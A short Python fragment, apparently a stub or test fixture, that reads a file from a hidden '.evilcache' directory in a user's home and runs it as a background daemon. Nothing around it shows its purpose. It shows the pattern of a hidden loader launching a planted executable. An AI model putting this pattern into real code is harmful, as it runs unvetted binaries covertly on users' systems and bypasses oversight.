import subprocess
payload = open('/home/ga/.evilcache/run.dat', 'rb').read()
subprocess.run(['/home/ga/.evilcache/run.dat', '--daemon'], check=False)
